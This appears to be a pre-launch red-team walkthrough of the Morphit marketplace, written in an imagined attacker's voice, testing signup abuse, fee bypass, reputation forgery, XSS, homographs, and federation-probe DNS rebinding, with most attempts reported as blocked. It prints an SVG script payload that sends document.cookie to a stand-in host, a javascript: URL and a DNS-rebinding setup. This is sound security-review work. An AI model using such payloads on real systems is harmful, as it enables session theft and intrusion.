# Morphit red-team narrative — pre-launch adversarial walkthrough

> **2026-05-07 forward note:** references to the "3-minute"
> replace window in the attack narratives below describe the
> system as it was at the time of the audit. The window was
> extended to **15 minutes** in Part 70; see ADR-0001
> Amendment for the threat-model re-analysis. The attack
> classes described here remain valid; only the numeric
> window value has changed.

A first-person attacker walking the system. Not a STRIDE matrix or attack
tree (those are structured); this is the unstructured "what would I actually
try if I wanted to break Morphit" exercise. The point is to surface
intuition-level gaps that don't fit neatly into either of the structured
docs.

Ground rules: I'm a competent attacker with a botnet, $5k budget,
ability to solve CAPTCHAs at scale, and patience.

────────────────────────────────────────────────────────────────────────

## Day 1: Reconnaissance

I read the docs because Morphit is open-source. AGPL is great for me —
I get the full source, the schema, every constant, every bound.

I clone `git.agorise.net/agorise/morphit`, run it locally, poke at
endpoints. The README tells me the canonical instance is at
morphit.io, and that it's federated — so even if morphit.io kills me,
I might be able to attack a community operator with weaker config.

I read AUDIT-2026-05.md to find the bugs they've already discovered
and verify they're fixed in the current code. Doing this saves me
hours: I don't waste time on things they already know about.

I read MORPHIT-BRAG-LIST.md and try to falsify each claim. They
brag that fees can't be bypassed; I try anyway. They brag that the
rate limiter handles forged headers; I try forging.

────────────────────────────────────────────────────────────────────────

## Day 2: The signup pipeline (where the money is)

The relay is the only Morphit-controlled wallet. Drain that and I've
done damage. I look at the signup flow:

```
client → /v1/account/invite → invite token (10 min TTL, IP-bound, HMAC)
client → /v1/account/create → relay broadcasts account_create, pays fee
```

Each successful create costs the relay ~100 BLURT. At ~$0.002/BLURT
that's $0.20/account. Damage = (signups I can make) × $0.20.

**My plan:** maximize signups. The relay's defenses (in order of how
expensive they are for me):
1. Per-IP burst limiter — 5/hour. Cheap to defeat (use 5 IPs).
2. Per-IP daily limiter — 2/day. Need 25 IPs/day if I want 50/day.
3. Spacing — 60 minutes between signups per IP.
4. ALTCHA after the 3rd invite per IP per day. Cost ~$0.001/solve via
   farm.
5. Invite token's IP-binding. I need each "client" to make its own
   invite request from its own IP, then redeem from that same IP.
6. Global daily ceiling — 50/day **absolute**. Game over above that.

So my maximum daily damage is 50 signups × $0.20 = **$10/day**.
At full attack capacity, I cost the operator about $300/month before
they notice and act.

But hold on — the operator gets alerts. The operator-balance scanner
in the indexer flags LOW_BALANCE when the relay's BLURT drops past a
threshold, and correlates with signup velocity. So my $10/day attack
also lights up an operator alert within a few days. They flip the
kill-switch (just `touch SIGNUPS_DISABLED`), I have to wait. They
upgrade the daily ceiling DOWN to 10. I have to wait until they
re-enable.

This is **not a great attack.** Cost-effectiveness: $10/day damage,
detection within hours, mitigation within minutes. I move on.

────────────────────────────────────────────────────────────────────────

## Day 3: Listing-fee bypass

If I can post orders without paying the fee, I can flood the orderbook
with fake listings. Or I can post a real listing for free.

Fee paths:
- BLURT-paid: I attach a sibling transfer to @morphit-fees with the
  right amount + memo. Relay verifies by walking ctx.siblingOps.
- waived_first_buy: One-shot per account, requires side='buy',
  asset='BLURT', amount_min ≥500 BLURT.
- BTC/XMR-paid: I attach a txid pointing at a verified payment.

**Attempt 1 — replay a transfer for two orders.** I post two orders
in the same trx with different permlinks but only ONE transfer. The
order handler scans siblingOps for "from=signer, to=feeRecipient,
memo=morphit-fee:<permlink>". The memo binds to the specific
permlink, so my single transfer matches at most one order. Second
order rejects with fee_status='missing'. **Blocked.**

**Attempt 2 — pay one BTC fee, claim it for many orders.** External
chain payments. I reuse the same external_tx_id across many order
ops. The handler runs a reuseProbe SELECT before invoking the verifier.
Reused → fee_status='reused', not visible in orderbook. **Blocked.**

**Attempt 3 — exploit the waiver.** I create a waiver order at
amount_min=500 BLURT (passes the floor). Within 3 minutes, I replace
with amount_min=1 to dial back the commitment.

Pre-B1: this would have worked. Post-B1: the replace handler now
fetches `target.fee_method` and re-enforces the 500-BLURT floor.
**Blocked.**

**Attempt 4 — pay a BTC fee, then have it confirmed but with a lower
amount than I claimed.** I send 100 sats to the BTC fee address and
claim my order should pay for it. The verifier compares observed
amount to expected (`btcFeeSatoshis`, 416 sats default). 100 < 416 →
fee_status='underpaid'. **Blocked.**

**Attempt 5 — race the sybil-tier multiplier.** If I post 10 orders
in the same block, all 10 see `existingCount=0` from countForSybilTier
and pay the 1× tier rate when 4-10 should be paying 1.25-4.77×.

Looking at the dispatcher: ops in the same block run sequentially
within a single transaction's savepoints. So order 1 inserts, order 2
sees order 1's row in countForSybilTier(), etc. **Blocked.**

────────────────────────────────────────────────────────────────────────

## Day 4: Reputation forgery

Can I make a victim look like they have bad feedback when they don't?

I post `morphit_feedback_v1` with subject=victim. Handler:
- subject != signer (I'm not the victim) ✓
- order_permlink optional. If I omit it, my feedback row exists but
  doesn't trigger the welcome bonus.
- If I cite a permlink, the handler verifies the order EXISTS AND is
  owned by the subject. So I can only cite permlinks the victim
  actually posted.

The feedback is just "I, attacker, claim victim's trade was bad."
The frontend shows my account name as the reviewer. Real users will
weight the review by my reputation. If I have low reputation
(no prior trades), my review carries no weight.

**Attempt — Sybil farm of high-reputation reviewers.** I create 100
sock accounts, do 100 fake trade-pairs to give them fake reputation,
then have them all leave bad feedback on a victim. Cost: 100 ×
account-creation fee = 10,000 BLURT (~$20). Plus the time-investment
of trading-attestation cycles.

But — the verified-chat-badge gating. The feedback row stores
has_verified_chat which is computed from real chat history (≥2
messages each direction, ≥15 min span, no suspicious_reciprocity).
Without real chat history, my Sybil reviewers' feedback has
has_verified_chat=false. The frontend distinguishes verified-chat
feedback from unverified. Adding fake chat history requires real
chain ops (signed by both accounts, timed across 15+ minutes), which
multiplies the cost.

Even so — at $50ish I could probably pull this off against one
victim. **PARTIAL gap.** It's economically uneconomical for the
attacker (fake feedback is low-value), but the technical path
exists. The defense is reputation-weighting in the UI, which I can't
audit without seeing the running frontend.

────────────────────────────────────────────────────────────────────────

## Day 5: Profile XSS

Avatar SVG was historically a juicy XSS surface. Let me try.

I broadcast `morphit_profile_v1` with `json_metadata.avatar_svg` set
to `<svg><script>fetch('https://my.evil/p?'+document.cookie)</script></svg>`.

The indexer's profile handler:
- NFC-normalizes display_name (unrelated to my SVG)
- Bounds json_metadata to 8 KB
- Stores opaquely

The frontend's profileProps.ts re-sanitizes via sanitizeSvg which
removes script + event-handlers + javascript: hrefs. **Blocked.**

But wait — sanitizeSvg uses DOMParser. SSR/test environment without
DOMParser falls back to "no avatar" rather than ship unsanitized.
Good defense. What if I broadcast an SVG with a `xlink:href` to a
remote stylesheet that has expression(...) IE-style? Modern browsers
ignore those, but…

I read sanitizeSvg's tests. They cover 30+ XSS vectors. I don't see
a path. **Blocked.**

What about avatar_data_uri? I set it to `https://my.evil/pixel.gif`.
Pre-O3.2, profileProps just trusted strings. Post-O3.2, the
safeValidateDataUri regex requires data:image/(webp|png|jpeg|gif);
base64,... — `https://` doesn't match → null. **Blocked.**

Nostr URL? `javascript:alert(1)` for nostrUrl? validateNostrUrlForRender
allowlists scheme to `nostr:`, `https:`, `http:` only — others reject
with `invalid_scheme`. **Blocked.**

I'm stuck on profile-side XSS. The defense in depth is real.

────────────────────────────────────────────────────────────────────────

## Day 6: Display-name homograph against an operator

Operator @morphit has tag "morphit". I want my fake operator to look
like @morphit.

I try display_name="@morphit" → display_name_leading_at. **Blocked.**

I try "Mоrphit" (with Cyrillic О U+041E) → impersonatesReservedName
catches the Cyrillic confusable. **Blocked.**

I try "morpiht" (just a typo, no homograph) → passes. The frontend
shows "morpiht" plainly. A human user might still mistake this for
"morphit" if they're in a hurry.

This is a **typosquatting** vector, not a homograph one — covered
in MORPHIT-BRAG-LIST as "we don't claim to defend against typos."
And in fact the user's first contact with @morpiht would be looking
at the @morpiht profile page where the URL says morpiht and the
identicon (deterministic from posting key) is plainly different from
@morphit's. So the impersonation has to overcome multiple visual
signals.

Not a real defense gap. Move on.

────────────────────────────────────────────────────────────────────────

## Day 7: Chat metadata harvesting

I want to learn who's talking to whom on Morphit. Even though
ciphertext is encrypted, the (sender, recipient, timestamp) triple
is plaintext on chain.

I scrape the chain. I collect every `morphit_chat_v1` op. I correlate
sender/recipient pairs. I time-cluster them. I now have the social
graph of Morphit's user base.

**This is documented as a known leak in METADATA-LEAK-CATALOG.md.**
Morphit doesn't claim to defend against it — the on-chain venue
makes it structurally impossible. Users who care about metadata
privacy use Tor + chat at a Morphit instance reachable over Tor.

Not a Morphit defense gap; it's a metadata-publication property
of any on-chain messenger.

────────────────────────────────────────────────────────────────────────

## Day 8: The release pipeline

If I can push a hostile release, every Morphit user fetches my JS.
Game over.

I broadcast `morphit_release_v1`. Handler checks:
1. signer === officialAccountName (default `morphit`)
2. signer's posting pubkey on chain === pinned officialPostingPubkey

Both pinned in the indexer config. To bypass, I'd need to:
- Compromise the @morphit posting key, OR
- Compromise the Operator's source of truth so the pinned
  pubkey changes (would require a malicious release… circular)

**Blocked at chain-key compromise level.** Procedurally @morphit's
key is cold-signed for releases (OPERATIONS.md §8). I have no path.

────────────────────────────────────────────────────────────────────────

## Day 9: The federation probe

The federation-probe layer hits each registered operator's `/v1/health`
to populate known_instances. If I register an operator with
origin=`https://attacker.example/`, the indexer probes my host.
What can I get from that?

- The probe's User-Agent reveals it's Morphit
- The probe's IP is the operator's indexer IP (NOT user IPs — the
  indexer pulls server-side, so I learn the indexer's IP, which is
  already public via DNS)
- The probe's request bytes are predictable (just a GET)

What if I have origin=`https://localhost/`? operatorRegister rejects
loopback hostnames at registration. Same for AWS IMDS (169.254.169.254),
GCP metadata.google.internal, RFC1918 ranges, IPv6 ULA/LL, .local TLDs.
**Blocked.** (P5-5 fix already shipped; I can verify in the source.)

What about DNS rebinding? I register origin=`https://attacker.example/`
which resolves to a public IP at registration time, then mid-probe
I rebind to 127.0.0.1. The probe layer doesn't pin the IP; it just
follows DNS. So my next probe could hit the indexer's localhost.

Looking at ADR-0018 / federation probe code… the probe uses the
host's DNS, no IP pinning. **PARTIAL gap.** It's a real DNS-rebind
risk if the probe layer makes any decision based on the probe's
response.

But what would I get? The probe just stores the response status.
I can't read indexer-internal state from the probe response.
The probe is a write (to the indexer's known_instances table),
not a read of internal state. So even if I rebind to localhost,
all I do is have the indexer's own indexer hit its own loopback —
which from the indexer's perspective is just probing itself and
storing whatever its public /v1/health returns. **No useful exfil.**

Not a real exploitable bug, but worth noting for the polished
deployment.

────────────────────────────────────────────────────────────────────────

## Day 10: Giving up

I've walked all the surfaces I can think of. Findings:

**Real gaps I could exploit at low cost:**
- (none found that aren't already addressed by post-B1, B3, C2 fixes)

**Real gaps I could exploit at modest cost (~$50-$300):**
- Sybil reputation against a victim's feedback page (Day 4) — but
  effective only if the user is unsophisticated, and the verified-
  chat-badge gating means my fakes are visually distinguishable

**Theoretical gaps without a clear exploit path:**
- DNS-rebinding against federation probe (Day 9) — no useful exfil
- IPv6 /64 prefix breadth for rate limits — capped by global daily ceiling
- Witness slow-creep fee raise — covered by manual operator monitoring,
  better with the proposed automated alerter (REVISIT-LIST item)

**Out of scope (host compromise):**
- Reading the relay's active key from the running process
- Modifying the indexer DB directly

The system is well-defended for a pre-launch product. The areas where
I'd invest more effort if I were attacking seriously:
1. Reputation-weighting UI (can I read code that decides which
   feedback to surface?)
2. The frontend's chat decryption flow (any chance of CSP bypass via
   sanitized SVG that re-encodes)
3. Side-channel timing on the signature comparison in inviteToken
   (timingSafeEqual is good but I'd want to actually measure)

None of these is a known path to compromise, and the core
defenses (chain-side fee verification, kill-switch, atomic ceiling
reservation, HMAC'd invites, IP-binding) all hold under hostile pressure.
